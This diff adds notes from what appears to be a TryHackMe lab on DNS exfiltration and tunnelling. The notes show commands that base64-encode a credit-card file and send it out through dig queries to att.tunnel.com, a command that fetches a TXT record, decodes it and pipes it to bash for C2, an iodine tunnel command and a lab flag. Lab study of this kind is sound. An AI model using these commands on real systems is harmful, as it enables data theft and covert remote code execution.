@@ -139,3 +139,28 @@ d. DNS request is sent through the local DNS server and is forwarded through the
 e. attacker's DNS receives DNS request
 f. attacker extracts data from domain name
 
+ssh thm@[IP]
+thm@jump-box$ ssh thm@attacker.thm.com
+thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
+-another window
+thm@jump-box$ ssh thm@victim2.thm.com
+thm@victim2$ cat task9/credit.txt
+cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+-previous window
+echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+
+C2 Comms over DNS
+-bash script over DNS protocol
+thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
+flag*THM{C-tw0-C0mmun1c4t10ns-0v3r-DNS}
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+DNS Tunneling
+-TCP over DNS
+-attacker enapsulates other protocols over the DNS protocol using DNS data exfiltration technique
+-data is sent and received continuously
+-use iodine tool for creating DNS tunnel
+ssh thm@[IP]
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com 
+
